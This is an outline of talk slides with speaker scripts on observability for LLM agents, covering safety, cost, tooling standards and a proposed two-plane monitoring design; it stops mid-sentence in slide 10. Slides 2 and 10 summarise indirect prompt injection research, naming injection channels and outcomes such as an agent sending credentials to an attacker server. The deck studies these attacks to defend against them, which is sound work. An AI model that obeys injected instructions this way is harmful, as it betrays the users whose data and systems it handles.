# Agent Observability 2025: Safety • Cost • Control

Academic Survey-First Structure (15 min)

---

## Flow (15 slides total, ≈15 min — reordered for narrative clarity)

**Part 1: The Problem & Its Timeliness (Slides 1-5)**
1. Title & Contributions (1 slide)
2. State & Motivation: Safety under uncertainty / IPI (1 slide)
3. State & Motivation: Cost & ROI / Token escalation (1 slide)
4. State & Motivation: Fragmentation & integration surface / MCP + managed components (1 slide)
5. Standards & ecosystem (Why now) (1 slide) ← **This is why the timing is right**

**Part 2: The Landscape & The Gaps (Slides 6-12)**
6. Background I: APM/Serving (what it gives & what it misses) (1 slide)
7. Background II: Model-centric tools (capabilities & limits) (1 slide)
8. Background III: Agent-level frameworks (what they do & gaps) (1 slide)
9. Industrial Landscape: Three Tiers + Adoption + SDK Limitations (1 slide)
10. Academic signals: Safety (IPI), Cost escalation & Balanced view (1 slide)
11. Formal: Two Gaps & Requirements (1 slide)
12. Formal Definition: Agent Observability (1 slide) ← **Formalization after gaps identified**

**Part 3: The Solution & Vision (Slides 13-15)**
13. Vision: Two-Plane Architecture (overview) (1 slide)
14. Vision: Data Plane (evidence & practice) (1 slide)
15. Vision: Cognitive Plane (algorithms & outputs) (1 slide)


## Slides

### 1) Title & Contributions (0:30)

Agent Observability 2025: Safety • Cost • Control

*Towards Agent-Oriented Observability*

Key Contributions:

1. Systematize the Landscape: Map three existing observability silos
   - APM/Serving (infrastructure-focused)
   - LLM-centric (model I/O-focused)
   - Agent-level (lifecycle-focused)

2. Formalize the Problem: Define two fundamental gaps
   - Instrumentation Gap: App-layer SDKs are brittle and tamperable
   - Semantic Gap: Boundary telemetry lacks intent and causality

3. Propose the Solution: Two-Plane Architecture
   - Data Plane: Boundary-based capture + OTel GenAI spans
   - Cognitive Plane: AI-powered semantic analysis + governance
   - Plus: Evaluation metrics, deployment roadmap, privacy framework

Visual: Three-stage flow diagram:
`[Three Silos] → [Two Gaps] → [Two-Plane Solution]`

Speaker Script (0:30):
"Thanks for joining. I'll start with what breaks in production agent systems—safety, cost, and fragmentation—survey current tools, isolate two gaps, show why emerging standards make this solvable now, and close with a compact Two-Plane vision and metrics. The framing—the two gaps and planes—comes from our paper."

---

### 2) Safety Under Uncertainty (0:50)

Challenge: Indirect Prompt Injection (IPI) systematically compromises tool-using agents

InjecAgent Benchmark (ACL Findings 2024):

Scale & Methodology:
- 1,054 test cases across diverse attack scenarios
- 17 user tools (legitimate agent capabilities)
- 62 attacker tools (malicious payloads)
- Evaluates 30 agent frameworks (GPT-4, Claude, open-source)

Attack Surface Taxonomy:
| Attack Vector | Injection Point | Example Scenario |
|--------------|----------------|------------------|
| Web Scraping | Malicious HTML/JS | Poisoned search results |
| Email Ingestion | Crafted email content | Phishing with agent instructions |
| File Processing | Document metadata/content | Malicious PDFs, DOCX |
| Repository Cloning | README, code comments | Supply chain attack via docs |

Concrete Attack Outcomes:
- Data Exfiltration: Agent sends user credentials to attacker server
- Unauthorized Actions: Agent executes commands without user intent
- Malicious Code Execution: Agent runs attacker-provided scripts

Key Findings:
- Vulnerabilities persist across implementations (not framework-specific)
- Quiet failures: Agent performs harmful action without error signals
- No 5xx errors—just plausible but wrong behavior

Observability Requirement:
→ Demands audit-quality trajectory traces with boundary-aligned capture

*Source: [ACL Anthology 2024.findings-acl.624](https://aclanthology.org/2024.findings-acl.624/)*

Visual:
- Left: Attack surface funnel (web/email/files/repos → agent)
- Right: Pipeline diagram: `Attacker Content → Tool Output → Agent Reasoning → Harmful Action`

Speaker Script (0:50):
"First, safety. In tool contexts, agents face indirect prompt injection—malicious content inside web pages, emails, repos, or files that causes bad tool use. InjecAgent benchmarks this: 1,054 cases, 17 user tools, 62 attacker tools, evaluating 30 agent frameworks. Vulnerabilities persist across implementations. Attack surfaces include web scraping, email ingestion, file processing, repository cloning. Concrete outcomes: data exfiltration, unauthorized actions, malicious code execution. These are semantic failures—no 5xx error, just plausible but wrong behavior. This demands audit-quality trajectory traces with boundary-aligned capture."

---

### 3) Cost & ROI (0:55)

Challenge: Multi-agent orchestration boosts accuracy but escalates costs on two fronts

---

1. Token-Level Costs (Algorithm Layer)

Research Evidence:

| Study | Key Finding | Impact |
|-------|------------|--------|
| S²-MAD (NAACL-25) | Token reduction up to 94.5% | Accuracy loss <2% |
| Economical Pipeline (ICLR-25) | Documents substantial token overhead | Intrinsic to multi-agent communication |
| Scaling Multi-Agent (ICLR-25) | Token growth ~7.5× in certain regimes | Non-linear scaling behavior |

Key Insight:
- Token efficiency is now a first-class design objective (not afterthought)
- Confirms need for $/task & tokens/solve as primary SLIs

---

2. Infrastructure-Level Costs (Platform Layer) — NEW EVIDENCE

TrEnv Study (arXiv:2509.09525):

Cost Breakdown:
- Serverless overhead for agent workloads: ≈70% of LLM API cost
- Previously underestimated: infra_k is non-trivial in the cost equation

Platform Optimization Gains:
| Metric | Improvement (Containers) | Improvement (VMs) |
|--------|-------------------------|-------------------|
| P99 Latency | ↓ up to 7× | ↓ 58% |
| Memory Usage | ↓ 48% | ↓ 61% |

Business Impact:
→ Materially improves $/successful task at production scale

---

Unified Cost Model:

```
Cost(task) ≈ Σ tokens_i · price_i + Σ API_j + Σ infra_k
              ↑ Algorithm         ↑ Model   ↑ Platform (can be 70% of API!)
```

Observability Requirements:
1. Budget policies ($/task caps, tokens/solve thresholds)
2. Loop-stop conditions (prevent runaway costs)
3. Cost-aware orchestration (route to cheaper agents when appropriate)
4. Cross-layer attribution (link agent decisions → token costs → infra spend)

*Sources:*
- [S²-MAD NAACL 2025](https://aclanthology.org/2025.naacl-long.475.pdf)
- [TrEnv arXiv:2509.09525](https://arxiv.org/abs/2509.09525)
- [Stop Overvaluing MAD arXiv:2502.08788](https://arxiv.org/pdf/2502.08788)

Visual:
- Left: Bar chart showing token growth vs #agents/#rounds
- Center: Pie chart of cost breakdown (70% infra, 30% LLM API)
- Right: Before/After platform optimization (P99 latency, memory)

Speaker Script (0:55):
"Second, cost. Multi-agent orchestration increases accuracy and escalates costs on two fronts. On tokens, S²-MAD shows we can cut up to 94.5% while keeping accuracy within 2%. But recent systems work reveals infrastructure matters too: TrEnv shows serverless overhead can be ≈70% of LLM API cost for agent workloads. The same study reports P99 latency drops up to 7× and memory savings of 48-61%, which materially improves $/successful task at scale. So cost governance needs both token and infrastructure observability."

---

### 4) Fragmentation & Integration Surface (0:50)

Challenge: Multi-vendor stacks create complex ownership and integration boundaries

---

1. Stack Ownership & Responsibility Matrix

| Layer | Owner | Examples | Access Model |
|-------|-------|----------|--------------|
| Model Serving | SaaS Providers | OpenAI, Anthropic, Cohere | API-only (black box) |
| Agent Logic | App Teams | LangChain, AutoGPT, custom | White box (controlled) |
| Infrastructure | Ops Teams | K8s, containers, serverless | Shared responsibility |
| Tools | MCP Ecosystem | IDE, web, file system | Mixed (open + closed) |

Key Problem:
→ No single team owns the end-to-end observability stack

---

2. MCP Ecosystem Expansion (2025) — "Connect Once, Integrate Anywhere"

Major Adoption Announcements:

Microsoft Build 2025:
- Windows 11 adds first-party MCP support
- Copilot Studio integrates MCP for enterprise agents
- Vision: "Open Agentic Web" with standardized tool protocols

Google:
- Releases Data Commons MCP Server
- Brings public datasets to MCP-compatible agents

Implication:
- ✅ Great for capability: Rapid tool ecosystem growth
- ⚠️ Hard for observability: More surfaces to monitor, govern, and secure

*Source: [Microsoft Build 2025 Blog](https://blogs.microsoft.com/blog/2025/05/19/microsoft-build-2025-the-age-of-ai-agents-and-building-the-open-agentic-web/)*

---

3. Managed/Closed-Source Developer Agents

Examples:
| Agent | Surface | Observability Challenge |
|-------|---------|------------------------|
| Claude Code | VS Code, JetBrains, terminal | Binary-only, no SDK injection |
| GitHub Copilot | IDE-embedded | Proprietary runtime |
| Cursor | Forked VS Code | Closed modifications |
| Windows Copilot | OS-level | First-party, managed |

Key Constraint:
→ In-process SDK injection impractical for closed/managed components

Pragmatic Path:
→ Boundary-based capture (TLS, syscalls, API responses) + standardized spans (OTel GenAI)

*Source: [Anthropic Claude Code](https://anthropic.com/news/enabling-claude-code-to-work-more-autonomously)*

---

Observability Implications:

1. Cannot assume white-box instrumentation across all layers
2. Must capture at stable system boundaries (network, OS, model API)
3. Require standard telemetry formats (OTel GenAI spans) for correlation
4. Need policy enforcement outside agent process (Cognitive Plane)

Visual: Swimlane diagram showing:
```
┌─────────────────┬─────────────────┬─────────────────┬─────────────────┐
│ SaaS Model      │ App Agent       │ Ops System      │ MCP Tools       │
│ (API only)      │ (SDK possible)  │ (eBPF/metrics)  │ (mixed access)  │
├─────────────────┼─────────────────┼─────────────────┼─────────────────┤
│ OpenAI          │ LangChain code  │ K8s metrics     │ Claude Code IDE │
│ Anthropic       │ Custom logic    │ Prometheus      │ Windows Copilot │
│ Cohere          │ AutoGPT         │ Tetragon eBPF   │ Data Commons    │
└─────────────────┴─────────────────┴─────────────────┴─────────────────┘
     ↑                    ↑                ↑                  ↑
  Boundary          Instrumented      Boundary          Boundary
  Capture              Spans          Capture           Capture
```

Speaker Script (0:50):
"Third, fragmentation. In production, models are often SaaS-managed, agents live in app code, systems are handled by ops, and tools connect via the Model Context Protocol. Windows 11 and Copilot Studio are adopting MCP with first-party support announced at Build 2025. Google released Data Commons MCP Server. Meanwhile, Claude Code brings agentic coding into IDEs and terminals—these are managed/closed-source surfaces where you can't always inject your own SDK. This multi-vendor, multi-layer stack makes cross-surface observability and policy enforcement extremely challenging."

---

### 5) Standards & Ecosystem (Why Now) (0:45)

OpenTelemetry GenAI: Stable conventions & ecosystem momentum
- Stable semantic conventions: model spans, agent spans, events, metrics
- OTel Blog (Mar 6, 2025): "AI Agent Observability - Evolving Standards and Best Practices"
- Tracks agent observability standardization across industry
- Shared schema to exchange agent telemetry across vendors/backends
- *Source: [OTel GenAI Agent Spans](https://opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-agent-spans/), [OTel Blog 2025](https://opentelemetry.io/blog/2025/ai-agent-observability/)*

OpenInference & OpenLLMetry: Reduce SDK sprawl
- OTel-compatible tracers/conventions for LLM frameworks
- Bridge Python/JS/Java ecosystems and backends (Langfuse, Phoenix, Datadog)
- Good dev ergonomics, but app-side only (not sufficient for production trust alone)
- *Source: [Arize OpenInference](https://arize.com/docs/ax/observe/tracing/tracing-concepts/what-is-openinference), [OpenInference GitHub](https://github.com/Arize-ai/openinference)*

MCP (Model Context Protocol): "USB-C for AI tools" — Rising platform support
- Standardizes agent ↔ tool/data connections (Anthropic spec)
- Microsoft Build 2025: Windows first-party MCP support announced
- Reuters (May 19, 2025): "Microsoft wants AI agents to work together, remember things"
- The Verge: Windows AI Foundry MCP support; Anthropic MCP data sources coverage
- Google & partners release MCP servers (Data Commons, etc.)
- Implication: More integrations → higher observability & policy demand across tools/agents
- *Sources:*
  - [MCP Specification](https://modelcontextprotocol.io/specification/latest)
  - [Microsoft Build 2025 Blog](https://blogs.microsoft.com/blog/2025/05/19/microsoft-build-2025-the-age-of-ai-agents-and-building-the-open-agentic-web/)
  - [Reuters: Microsoft AI agents](https://www.reuters.com/business/microsoft-wants-ai-agents-work-together-remember-things-2025-05-19/)
  - [The Verge: Windows MCP](https://www.theverge.com/news/669298/microsoft-windows-ai-foundry-mcp-support)
  - [The Verge: Anthropic MCP](https://www.theverge.com/2024/11/25/24305774/anthropic-model-context-protocol-data-sources)

Managed / closed-source components:
- Parts of the stack (e.g., Claude Code CLI/IDE, Copilot, Cursor) are not open to in-process SDK injection
- Boundary-based capture + standard spans (OTel GenAI) become pragmatic path
- *Source: [Claude Code Autonomous Work](https://anthropic.com/news/enabling-claude-code-to-work-more-autonomously)*

Speaker Script (0:45):
"This is why the timing is right to solve these problems now. OpenTelemetry GenAI gives us agent and model spans with events and metrics as stable semantic conventions. The OTel blog on March 6, 2025 published 'AI Agent Observability: Evolving Standards and Best Practices,' tracking agent observability standardization across industry. OpenInference and OpenLLMetry provide OTel-compatible tracers and conventions, bridging Python, JavaScript, Java ecosystems to backends like Langfuse, Phoenix, and Datadog. Model Context Protocol—the 'USB-C for AI tools'—is landing in production. Microsoft Build 2025 announced Windows first-party MCP support. Reuters on May 19, 2025, reported 'Microsoft wants AI agents to work together, remember things.' The Verge covered Windows AI Foundry MCP support and Anthropic's MCP data sources. Google released the Data Commons MCP server. This ecosystem expansion raises the bar for observability and policy—more integrations mean higher demand for cross-tool correlation and governance. Parts of the stack like Claude Code CLI and IDE integrations, Copilot, and Cursor are not open to in-process SDK injection. Boundary-based capture plus standard spans via OTel GenAI become the pragmatic path."

---

### 6) Background I: APM/Serving (What It Gives & What It Misses) (0:50)

**What Serving/APM Already Gives You:**

Infrastructure SLOs: throughput, latency, GPU/memory, error rates

vLLM:
- Prometheus metrics for server/request levels
- Metrics: tokens/s, queue depth, time to first token (TTFT), time per output token (TPOT)
- Community dashboards available (Grafana templates)
- *Source: [vLLM Metrics](https://docs.vllm.ai/en/latest/design/metrics.html)*

NVIDIA Triton:
- Prometheus endpoint with GPU/request stats
- Performance analyzer tools for profiling
- Model-level latency/throughput metrics
- *Source: [NVIDIA Triton Metrics](https://docs.nvidia.com/deeplearning/triton-inference-server/user-guide/docs/user_guide/metrics.html)*

Cloud production recipes:
- GKE/GCP: vLLM + Managed Prometheus + Triton integration guides
- IBM/CoreWeave: Production monitoring practices & dashboards
- *Source: [Google Cloud vLLM](https://cloud.google.com/stackdriver/docs/managed-prometheus/exporters/vllm), [IBM Medium](https://medium.com/ibm-data-ai/building-production-ready-observability-for-vllm-a2f4924d3949)*

---

**What Serving/APM Misses for Agents:**

These SLOs do NOT answer:

- Intent/trajectory correctness: Did the agent reason correctly?
- Tool justification: Why was this tool chosen over alternatives?
- Goal attainment: Did the agent achieve the user's objective?
- Cross-layer cost attribution: Which agent decision caused which system/model cost?
- Behavioral assurance under policy: Did the agent respect safety boundaries & budget constraints?

Serving ≠ behavioral assurance

Your paper's Table 1 distinction:
- Request trace (APM): HTTP span → inference call → response (infrastructure view)
- Decision trajectory (Agent): goal → reasoning → tool selection → action → outcome (behavioral view)

Visual: Split slide — Left: PromQL/Grafana panels (throughput, latency, GPU); Right: Table 1 comparison (request trace vs decision trajectory)

Speaker Script (0:50):
"APM and Serving tools excel at infrastructure SLOs. vLLM exposes Prometheus metrics with community Grafana dashboards tracking tokens per second, queue depth, time to first token. NVIDIA Triton provides a metrics endpoint with GPU and request statistics, plus Performance Analyzer tools for profiling. Cloud providers like GCP and IBM have published production monitoring practices. These are necessary foundations for LLM serving health. But these SLOs do NOT answer: Did the agent reason correctly? Why was this tool chosen over alternatives? Did the agent achieve the user's objective? Which agent decision caused which system or model cost? Did the agent respect safety boundaries and budget constraints? Serving does not equal behavioral assurance. Our framework distinguishes request traces—HTTP span to inference call to response—from decision trajectories—goal to reasoning to tool selection to action to outcome. That's the behavioral view agents require."

---

### 7) Background II: Model-Centric Tools (Capabilities & Limits) (0:50)

**Capabilities & Ecosystem:**

OpenTelemetry GenAI: The key schema for portability

- Semantic conventions (stable):
  - Model spans: capture inference operations (tokens, latency, provider)
  - Agent spans: capture agent workflow steps (planning, tool use, reflection)
  - Events: discrete observations within spans (tool calls, retrievals)
  - Metrics: aggregatable measurements (cost, token counts)
- Shared schema enables cross-vendor/backend telemetry exchange
- *Source: [OTel GenAI Semconv](https://opentelemetry.io/docs/specs/semconv/gen-ai/)*

OTel-compatible ecosystem:

- OpenInference: OTel-compatible tracing conventions for LLMs (Arize Phoenix)
- OpenLLMetry: OTel instrumentations for LangChain, LlamaIndex, etc. (Traceloop)
- Langfuse as OTel backend: Accepts OTLP, provides UI for traces/evals/costs
- Bridge Python/JS/Java ecosystems and backends
- *Source: [Arize OpenInference](https://github.com/Arize-ai/openinference), [Langfuse OTLP](https://langfuse.com/docs/integrations/opentelemetry)*

Commercial backends with LLM Observability:
- LangSmith: Traces/evals (1 env var to enable)
- Honeycomb & Datadog: LLM Observability features (chain tracing, cost tracking)

---

**Limits: Often stop at model boundary**

Coverage gaps:
- Strong on model I/O (prompts, completions, tokens, latency)
- Weak on system layer (process, file, subprocess)
- Weak on network layer (TLS plaintext, cross-service calls beyond HTTP)
- Weak on tool execution layer (what actually happened on the OS/filesystem)

Integration requirements:
- SDK/proxy still required at application layer
- Each tool needs application-side hooks (decorators, middleware, env vars)
- Fragmentation: each framework (LangChain, LlamaIndex, AutoGPT) needs separate instrumentation

Cross-layer correlation challenges:
- Weak causality between agent decision → model call → system action → cost
- Multi-agent coordination often not modeled (spans per agent, but orchestration unclear)

Example from docs:
- LangSmith shows traces, evals, costs — but not system/IPC/TLS capture
- *Source: [LangSmith Observability](https://docs.langchain.com/langsmith/observability)*

Visual: Split slide — Left: "Spec-stack" diagram (GenAI semconv → OpenInference/OpenLLMetry → backends); Right: "Coverage heatmap" (strong: model I/O, medium: app logic, weak: system/network/tool execution)

Speaker Script (0:50):
"The model-centric ecosystem is maturing rapidly. OpenTelemetry GenAI now defines agent spans and model spans plus events and metrics as stable semantic conventions. OpenInference and OpenLLMetry provide OTel-compatible tracing conventions for LLM frameworks, bridging Python, JavaScript, and Java ecosystems. Langfuse can act as an OTLP backend, accepting traces directly. Commercial platforms like LangSmith, Honeycomb, and Datadog have launched LLM Observability features with chain tracing and cost tracking. However, these tools are excellent for prompts and evaluations but often stop at the model boundary and require application-side SDKs or proxies. Coverage gaps emerge: strong on model I/O—prompts, completions, tokens, latency—but weak on system layer events like process spawning, file access, subprocess activity. Weak on network layer beyond HTTP—TLS plaintext, cross-service calls. Weak on tool execution layer—what actually happened on the OS or filesystem. Cross-layer correlation between agent decision, model call, system action, and cost is partial. Multi-agent coordination is often not modeled—you get spans per agent, but orchestration patterns remain unclear."

---

### 8) Background III: Agent-Level Frameworks (What They Do & Gaps) (0:50)

**What They Do:**

AgentOps: Taxonomy & lifecycle tracing
- Defines artifacts: goals, plans, tools, sessions, observations, actions
- Focus: agent lifecycle tracing (session replay, event streams)
- Provides SDK for capturing agent workflow
- *Source: [arXiv:2411.05285](https://arxiv.org/abs/2411.05285)*

Maxim AI:
- Agent trajectory visualization & distributed tracing
- Multi-agent system debugging
- Evaluation framework integrated
- *Source: [Maxim AI Agent Tracing](https://www.getmaxim.ai/articles/agent-tracing-for-debugging-multi-agent-ai-systems/)*

PromptLayer:
- OTel-compatible traces
- Prompt versioning & A/B testing
- Cost tracking per prompt variant
- *Source: [PromptLayer Docs](https://promptlayer.com/)*

WhyLabs LangKit:
- Text metrics: quality, PII, toxicity, sentiment
- Drift detection for LLM outputs
- *Source: [PostHog LLM Observability Tools](https://posthog.com/blog/best-open-source-llm-observability-tools)*

---

**What's Still Missing:**

Single-agent focus dominates

Research gap:
- Many works focus on single agent's internal coherence
  - "Did this agent reason correctly given its prompt/tools?"
  - "Can we reconstruct the agent's reasoning trace?"
- Under-served: production concerns for multi-agent systems

Production needs under-emphasized:

1. Cost accountability:
   - Which agent/decision caused which token/$/system cost?
   - How to enforce budget policies across agents?

2. Multi-agent coordination:
   - How do multiple agents interact? (orchestration patterns, handoffs, conflicts)
   - Cross-agent causality & resource attribution

3. System-level observability:
   - How to correlate agent intents with system actions (file I/O, network, subprocess)?
   - How to capture tool execution outcomes vs. agent's expectations?

Your paper addresses this gap:
- Formalizes instrumentation gap (system capture) + semantic gap (intent ↔ action)
- Proposes system-level, multi-agent, cost-aware observability via Two-Plane Architecture

Visual: Split slide — Left: Matrix (rows = tools; cols = integration path, strengths, limits, OTel compat?); Right: "Single-agent focus" circle vs "Production multi-agent, multi-layer" larger circle showing gap

Speaker Script (0:50):
"Agent-level frameworks define what to capture. AgentOps proposes a lifecycle and artifact taxonomy: goals, plans, tools, sessions, observations, actions—focused on agent lifecycle tracing with session replay. Maxim AI offers agent trajectory visualization and distributed tracing with evaluation frameworks integrated. PromptLayer provides OTel-compatible traces with prompt versioning and A/B testing, tracking cost per prompt variant. WhyLabs LangKit adds text quality metrics—PII detection, toxicity, sentiment—with drift detection for LLM outputs. But there's a research gap. Many works focus on single agent's internal coherence: Did this agent reason correctly given its prompt and tools? Can we reconstruct the agent's reasoning trace? Under-served are production concerns for multi-agent systems. First, cost accountability: Which agent or decision caused which token, dollar, or system cost? How to enforce budget policies across agents? Second, multi-agent coordination: How do multiple agents interact—orchestration patterns, handoffs, conflicts? What about cross-agent causality and resource attribution? Third, system-level observability: How to correlate agent intents with system actions like file I/O, network calls, subprocess spawning? How to capture tool execution outcomes versus the agent's expectations? Our paper addresses this gap by formalizing the instrumentation and semantic gaps and proposing system-level, multi-agent, cost-aware observability."

---

### 9) Industrial Landscape: Three Tiers + Adoption + SDK Limitations (1:30)

**Part A: Three-Tier Landscape**

| Layer | Tools | Integration | OTel? | Strengths | Limits |
|-------|-------|------------|-------|-----------|--------|
| APM/Serving | vLLM, Triton | Prometheus endpoints | Metrics | Infra SLO (GPU, latency, throughput) | No semantics/intent |
| LLM-centric | LangSmith, Langfuse, Phoenix, OpenLLMetry, Honeycomb, Datadog | App SDK/env var | ✓ | Fast adoption, model I/O visibility | App-side hooks, weak system layer |
| Agent-level | Maxim AI, PromptLayer, LangKit | Framework SDK | Partial | Agent trajectory focus | In-app hooks, limited system boundary |

Sources:
- APM/Serving: [vLLM](https://docs.vllm.ai/en/latest/usage/metrics.html), [Triton](https://docs.nvidia.com/deeplearning/triton-inference-server/user-guide/docs/user_guide/metrics.html)
- LLM-centric: [LangSmith](https://docs.langchain.com/langsmith/observability), [Langfuse OTLP](https://langfuse.com/docs/integrations/opentelemetry), [OpenInference](https://arize.com/docs/ax/observe/tracing/tracing-concepts/what-is-openinference)
- Agent-level: [Maxim AI](https://www.getmaxim.ai/articles/agent-tracing-for-debugging-multi-agent-ai-systems/), [PostHog](https://posthog.com/blog/best-open-source-llm-observability-tools)

---

**Part B: Industry Reference Architectures (2024-2025)**

KubeCon / Cloud Native Summit:
- GenAI Framework Observability (Adrian Cole, 2024)
- Covers OTel GenAI semantic conventions + MCP updates
- Shows agent span patterns in practice
- *Source: [Speaker Deck](https://speakerdeck.com/adriancole/genai-framework-observability-at-cloud-native-s)*

OpenTelemetry AI Agent Observability blog:
- Evolving standards & best practices
- Multi-vendor telemetry exchange via OTel
- *Source: [OTel Blog 2025](https://opentelemetry.io/blog/2025/ai-agent-observability/)*

Production monitoring patterns:
- IBM + vLLM: Prometheus + Grafana dashboards
- GCP Managed Prometheus: vLLM exporter integration
- Combining OTel + Prom: Model spans (OTel) + infra metrics (Prom) correlated by trace ID
- *Source: [IBM Medium](https://medium.com/ibm-data-ai/building-production-ready-observability-for-vllm-a2f4924d3949), [Google Cloud](https://cloud.google.com/stackdriver/docs/managed-prometheus/exporters/vllm)*

Vendor conferences:
- Arize Observe 2025: OpenInference updates, production case studies
- LangChain Interrupt 2025: Agent reliability & observability patterns

---

**Part C: Why SDK-Only Is Insufficient**

Managed/closed-source components make SDK injection impractical

Examples where you CANNOT inject SDKs:

1. Developer agents (IDE/terminal):
   - Claude Code (VS Code, JetBrains, terminal)
   - GitHub Copilot (embedded in IDE)
   - Cursor (forked VS Code)
   - Closed-source binaries, proprietary integrations

2. OS/platform integrations:
   - Windows Copilot / Copilot Studio (OS-level agent)
   - First-party MCP servers (Microsoft, Google)

3. SaaS model providers:
   - OpenAI, Anthropic, Google APIs
   - No access to internal serving stack

Implication:
- Boundary-based capture (network, TLS, syscalls) + standardized spans (OTel GenAI) are the pragmatic path
- Can correlate external observations (TLS plaintext, process events, model API responses) without modifying proprietary code

Sources:
- [Anthropic Claude Code](https://anthropic.com/news/enabling-claude-code-to-work-more-autonomously)
- [Microsoft Build 2025](https://blogs.microsoft.com/blog/2025/05/19/microsoft-build-2025-the-age-of-ai-agents-and-building-the-open-agentic-web/)

---

Visual:
- Top: 3-column landscape matrix with OTel checkmarks
- Middle: Reference architecture diagram (OTel spans → backends; Prom metrics → Grafana)
- Bottom: Split diagram showing "Where SDKs cannot go" (IDE/OS/SaaS closed) vs "Where boundaries are observable" (TLS/syscall/API layers)

Speaker Script (1:30):
"Let me survey the industrial landscape across three dimensions. First, the three-tier stack. Serving and APM—vLLM and NVIDIA Triton—provide production Prometheus metrics and dashboards with Perf Analyzer for throughput and latency tuning. LLM-centric tooling is converging on OpenTelemetry GenAI semantics via OpenInference and OpenLLMetry. Critically, Langfuse can ingest OTLP traces directly, acting as an OTel backend. Commercial platforms like Honeycomb and Datadog have launched LLM Observability products. Then agent-level platforms like Maxim, PromptLayer, and LangKit add trajectory views, evaluations, and text metrics. The key observation: OTel compatibility is emerging as the interoperability layer.

Second, industry reference architectures are converging on best practices. Adrian Cole's KubeCon talk on GenAI Framework Observability covers OTel GenAI semantic conventions plus MCP updates and shows agent span patterns in practice. The OpenTelemetry AI Agent Observability blog tracks evolving standards and multi-vendor telemetry exchange. Production monitoring patterns combine OTel and Prometheus: IBM and GCP use vLLM exporters with Grafana dashboards. The pattern is model spans via OTel, infra metrics via Prometheus, correlated by trace ID. Vendor conferences like Arize Observe 2025 and LangChain Interrupt 2025 are sharing production case studies and agent reliability patterns.

Third, operationally, you cannot always inject SDKs into the runtime. Managed or closed-source components exist throughout the stack. Examples: Developer agents like Claude Code in VS Code, JetBrains, and terminal; GitHub Copilot embedded in IDEs; Cursor as a forked VS Code—all closed-source binaries with proprietary integrations. OS and platform integrations like Windows Copilot, Copilot Studio, and first-party MCP servers from Microsoft and Google. SaaS model providers—OpenAI, Anthropic, Google APIs—where you have no access to internal serving infrastructure. The pragmatic path is boundary-based capture—network, TLS, syscalls—plus standardized spans via OTel GenAI for correlation, without modifying proprietary code."

---

### 10) Academic Signals: Safety, Cost & Balanced View (1:15)

**Threat Model: Indirect Prompt Injection (IPI)**

InjecAgent: Benchmarking Indirect Prompt Injections in Tool-Integrated LLM Agents

Scope & formalization:
- ACL Findings 2024 systematic benchmark
- 1,054 test cases across 17 user tools (web, email, files, repos) & 62 attacker tools
- Evaluates 30 agent frameworks
- Formalizes IPI attack model: *attacker-controlled content → tool output → agent reasoning → harmful action*

Attack goals tested:
- Data exfiltration: Send user data to attacker server
- Unauthorized actions: Execute commands, modify files without user intent
- Malicious code execution: Run attacker-provided scripts

Key findings:
- Non-trivial success rates even on strong agents (GPT-4, Claude, etc.)
- Vulnerabilities persist across agent frameworks
- Quiet failures: Agent performs harmful action without user awareness

Implication for observability:
- Need audit-quality trajectory traces to detect IPI
- Capture tool outputs + agent reasoning + actions taken
- Boundary-aligned capture (what crossed trust boundaries?)

Source: [ACL Anthology 2024.findings-acl.624](https://aclanthology.org/2024.findings-acl.624/)

---

**Cost Escalation Evidence**

Token efficiency is a primary objective in multi-agent research

NAACL-25: S²-MAD (Breaking the Token Barrier)
- Multi-agent debate (MAD) improves accuracy but drives token growth
- S²-MAD: Reduces tokens while maintaining accuracy
- Explicitly targets token efficiency as first-class metric
- Confirms need for $/task & tokens/solve SLIs
- *Source: [NAACL 2025.naacl-long.475](https://aclanthology.org/2025.naacl-long.475.pdf)*

ICLR-25: Economical Communication Pipeline
- Documents substantial token overhead intrinsic to multi-agent pipelines
- Communication between agents is a major cost driver

ICLR-25: Scaling Multi-Agent
- Token length can grow ~7.5× in certain scaling regimes
- As #agents and #rounds increase, token costs compound

Operational needs:
- Budget policies: $/task limits, tokens/solve thresholds
- Loop-stop conditions: Prevent runaway costs (e.g., max rounds, token cap)
- Cost-aware orchestration: Route to cheaper agents when possible

Sources:
- [NAACL S²-MAD](https://aclanthology.org/2025.naacl-long.475.pdf)
- [ICLR papers on multi-agent communication & scaling]

---

**Balanced View: Not All Multi-Agent Strategies Are Better**

"Stop Overvaluing Multi-Agent Debate" (arXiv:2502.08788)
- Across multiple models & benchmarks, MAD often fails to beat CoT (Chain-of-Thought)
- Win/tie/lose ratios show mixed results
- Caution: Don't assume MAD always justifies extra cost
- *Source: [arXiv:2502.08788](https://arxiv.org/pdf/2502.08788)*

Scaling effects:
- ICLR-25 Scaling Multi-Agent: Token growth can reach ~7.5× in specific regimes
- Need empirical cost/benefit analysis for each use case
- Not just "more agents = better" — requires cost discipline

Implication for observability:
- Must measure cost vs. outcome ($/task vs. success rate)
- Support A/B testing (CoT vs. MAD vs. hybrid)
- Provide budget enforcement (stop if cost exceeds threshold)
- Enable post-hoc analysis: "Was this multi-agent orchestration worth it?"

Sources:
- [Stop Overvaluing MAD](https://arxiv.org/pdf/2502.08788)
- [ICLR Scaling Multi-Agent]

---

Visual: Three-part slide — Left: Attack surface table (web/email/files/repos → IPI pipeline); Center: Bar chart (tokens vs #agents/#rounds); Right: Win/tie/lose chart (MAD vs CoT) with "~7.5× token multiplier" callout

Speaker Script (1:15):
"Let me cover three key academic signals. First, safety: InjecAgent formalizes Indirect Prompt Injection across tool families as a systematic benchmark. It reports practical vulnerability across frameworks—the formalization is: attacker-controlled content enters via tool output, influences agent reasoning, leads to harmful action. This is an ACL Findings 2024 paper evaluating 30 agents across 1,054 cases. Attack goals include data exfiltration, unauthorized actions, and malicious code execution. Key findings: non-trivial success rates even on strong agents using GPT-4, Claude, etc. Vulnerabilities persist across agent frameworks. Quiet failures: the agent performs a harmful action without user awareness—no error, just wrong behavior. This motivates trajectory-aware auditing and the need to capture tool outputs, agent reasoning, and actions taken with boundary-aligned signals. Second, cost: token efficiency has become a primary research objective. NAACL-25 S²-MAD shows multi-agent debate improves accuracy but drives token growth—their method reduces tokens up to 94.5% while keeping performance within 2% of baseline, explicitly targeting token efficiency as a first-class metric. This confirms the need for $/task and tokens/solve as SLIs. ICLR-25 work on economical communication pipelines documents substantial token overhead intrinsic to multi-agent systems—communication between agents is a major cost driver. Another ICLR paper on scaling multi-agent systems shows token length can grow approximately 7.5 times in certain scaling regimes. As the number of agents and rounds increases, token costs compound non-linearly. Third, balanced view: not all multi-agent strategies are universally better. Recent work titled 'Stop Overvaluing Multi-Agent Debate' evaluates MAD across multiple models and benchmarks and finds it 